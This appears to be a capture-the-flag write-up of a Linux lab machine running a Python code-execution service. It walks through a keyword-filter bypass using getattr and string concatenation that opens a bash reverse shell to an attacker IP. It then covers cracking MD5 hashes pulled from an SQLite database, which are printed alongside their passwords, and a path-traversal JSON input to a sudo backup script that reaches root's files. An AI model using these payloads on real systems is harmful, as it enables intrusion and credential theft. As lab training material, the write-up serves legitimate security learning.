# Code

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.231.240`

## Summary
**Code** is an easy-difficulty Linux machine hosting an online Python code execution service. Initial access is achieved by bypassing the application's keyword-based sandbox filtering through Python reflection/built-in attribute obfuscation to execute arbitrary system commands. Lateral movement to the user `martin` is accomplished by recovering MD5 password hashes from an SQLite database (`database.db`) located in the web application directory. Privilege escalation to `root` is completed by exploiting `sudo` privileges granted on a backup script (`/usr/bin/backy.sh`) that processes user-supplied JSON tasks insecurely, allowing directory traversal to read arbitrary root files.

##  Reconnaissance

### Port Scanning (Nmap)
We begin by scanning active TCP ports and identifying service versions:

- **22**: SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.12)
- **5000**: HTTP (Gunicorn 20.0.4)

### Web Application Analysis

Navigating to `http://10.129.231.240:5000/` reveals an online Python code editor featuring registration and login functionalities. Testing basic administrative command execution:

```
import os
os.system("whoami")
```

The application rejects the request, warning that restricted keywords are present. Incremental testing reveals a blocklist targeting strings such as `import`, `os`, and `system`.

## Exploitation (Initial Access)

### Python Sandbox Bypass (RCE)
To bypass the naive string-matching filter, we dynamically construct forbidden modules and function names using string concatenation and reflection via standard library built-ins (`getattr`):

```
test = getattr(print.__self__, '__im' + 'port__')('o' + 's')
getattr(test, 'sy' + 'stem')('bash -c "bash -i >& /dev/tcp/10.10.14.28/443 0>&1"')
```

- We set up a Netcat listener on our attack host (`10.10.14.28:443`).
- Executing the obfuscated code trigger bypasses the blocklist filters and provides an unprivileged shell as `guest`.

## Pivoting / Lateral Movement

### Database Enumeration
Inspecting local application files within the `instance` directory reveals an SQLite database:

```
sqlite3 instance/database.db
.tables
select * from user;
```

We extract the following user records and MD5 hashes:

```
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

### Hash Cracking & Access Verification
Cracking these hashes via `hashes.com` yields the corresponding passwords:

- `development` : `development`
- `martin` : `nafeelswordsmaster`

We authenticate as `martin` over SSH to gain an interactive terminal session and retrieve `user.txt`:

```ssh martin@10.129.231.240```

## Privilege Escalation (Root Flag)

### Sudo Privilege Enumeration
Checking permitted `sudo` binaries for `martin`:

```sudo -l```

Output:

```(ALL : ALL) NOPASSWD: /usr/bin/backy.sh```

Running the script without arguments displays its expected syntax:

```Usage: /usr/bin/backy.sh <task.json>```

### Exploiting Path Traversal in Task Configurations
The `backy.sh` utility parses input parameter paths from JSON task files without strictly enforcing normalization checks.

1) We construct a customized `task.json` file modifying the target archive scope with directory traversal patterns:

```
{
  "directories_to_archives": "/home/....//root"
}
```

2) Executing sudo `/usr/bin/backy.sh task.json` bypasses path restrictions, allowing the script to archive and process sensitive files under `/root/`.
3) Extracting the generated backup archive yields direct access to read the `root.txt` flag (or extract root's SSH keys for full interactive access).

## Conclusions & Key Lessons
**Insecure Blacklisting:** Relying on basic string matching/keyword blocklists for sandboxing interpreters like Python is fundamentally flawed due to dynamic reflection abilities.
**Weak Hash Algorithms:** Unsalted MD5 hashes in local database files remain vulnerable to instant lookup table attacks.
**Insecure Sudo Scripts:** Administrative helper scripts invoked with elevated sudo rights must rigorously sanitize file paths supplied via configuration files (e.g., JSON parameters) to prevent path traversal attacks.
